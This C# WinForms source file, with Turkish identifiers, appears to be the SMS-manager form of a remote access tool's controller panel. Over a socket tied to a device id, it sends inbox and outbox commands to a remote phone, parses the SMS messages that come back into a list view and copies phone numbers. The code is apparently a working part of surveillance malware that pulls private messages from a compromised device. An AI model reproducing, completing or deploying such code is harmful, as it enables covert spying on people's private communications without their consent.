using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class SMSYoneticisi : MetroFramework.Forms.MetroForm
    {
        public string uniq_id = "";
        Socket sck;
        public SMSYoneticisi(Socket sock, string id)
        {
            InitializeComponent();
            sck = sock;
            uniq_id = id;
            listView1.DoubleClick += listView1_DoubleClick;
        }
        List<ListViewItem> lArray = new List<ListViewItem>();
        public void bilgileriIsle(string arg)
        {
            listView1.Items.Clear();
            lArray.Clear();
            if (arg != "SMS YOK")
            {
                string[] ana_Veriler = arg.Split(new[] { "[MYSMSDATA]" },StringSplitOptions.None);
                for (int k = 0; k < ana_Veriler.Length; k++)
                {
                    try
                    {
                        string[] bilgiler = ana_Veriler[k].Split(new[] { "[MYSMS]" }, StringSplitOptions.None);
                        ListViewItem item = new ListViewItem(bilgiler[0]);
                        item.ImageIndex = 0;
                        item.SubItems.Add(bilgiler[4]);
                        item.SubItems.Add(bilgiler[1]);
                        item.SubItems.Add(bilgiler[2]);
                        item.SubItems.Add(bilgiler[3]);
                        //listView1.Items.Add(item);
                        lArray.Add(item);
                    }
                    catch (Exception) { }
                }
                listView1.Items.AddRange(lArray.ToArray());
                metroLabel1.Text = "Items: " + listView1.Items.Count.ToString();
            }
            else
            {
                ListViewItem item = new ListViewItem("There is no SMS");
                listView1.Items.Add(item);
                metroLabel1.Text = "Items: 0";
            }
        }
        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                if (listView1.SelectedItems[0].Text.Contains("There is no")) return;
                try
                {
                    listView1.SelectedItems[0].ImageIndex = 1;
                    new Goruntule(listView1.SelectedItems[0].SubItems[1].Text + " - " + Text.Replace("SMS Manager - ", ""),
                        listView1.SelectedItems[0].SubItems[2].Text).Show();
                }
                catch (Exception) { }
            }
        }
        private void ıncomingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("GELENKUTUSU", Encoding.UTF8.GetBytes("ECHO"));
                sck.Send(senddata, 0, senddata.Length, SocketFlags.None);
            }
            catch (Exception) { }
        }

        private void outgoingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("GIDENKUTUSU", Encoding.UTF8.GetBytes("ECHO"));
                sck.Send(senddata, 0, senddata.Length, SocketFlags.None);
            }
            catch (Exception) { }
        }

        private void copyNumberToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].Text.Contains("There is no")) return;
                Clipboard.SetText(listView1.SelectedItems[0].Text);
            }
        }
    }
}
